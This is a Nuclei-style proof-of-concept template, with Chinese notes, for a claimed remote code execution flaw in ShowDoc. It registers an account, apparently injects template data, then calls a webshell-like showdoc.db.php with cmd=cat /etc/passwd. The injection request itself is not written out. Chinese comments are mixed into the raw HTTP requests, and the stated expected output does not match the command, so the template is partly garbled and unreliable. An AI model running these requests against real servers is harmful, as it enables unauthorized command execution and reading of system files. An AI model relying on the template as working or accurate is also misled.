id: poc-ikgwh79hv2g610qk
info:
  name: ShowDoc template_save存在代码注入漏洞
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2026
http:
- raw:
  - 'POST /server/index.php?s=/Api/Common/createCaptcha HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /server/index.php?s=/api/common/showCaptcha&captcha_id=460 HTTP/1.1

    Host: {{Hostname}}


    注册合法用户名'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /server/index.php?s=/api/user/registerByVerify HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=seccheck_ok01&password=SecTest@2026&confirm_password=SecTest@2026&captcha_id=460&captcha=T366


    携带token写入模板数据


    触发'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - "GET /Sqlite/showdoc.db.php?cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n响应为 SQLite 二进制垃圾数据，中间夹带：\n|SHOWDOC_RCE_BGN|www-data|SHOWDOC_RCE_END|\n\nPS:使用官方默认 Sqlite/showdoc.db.php 的实例）在执行到触发步骤时会返回 HTTP 500 Internal Server Error，响应体为空,是因为数据库文件内部存在一张名为 \"<?php \" 的防护表：\n\nCREATE TABLE \"<?php \" (\n    `防止sqlite的数据库文件被直接下载` INTEGER\n)\n\n当 Web 服务器把 .db.php 交给 PHP 解析时，扫描器会把表名 \"<?php \" 识别为 PHP 起始标记，随后把后面的 SQLite 二进制数据当作 PHP 代码解析，必然触发语法错误 → HTTP 500。"
  redirects: false
  matchers:
  - status:
    - 200
    type: status
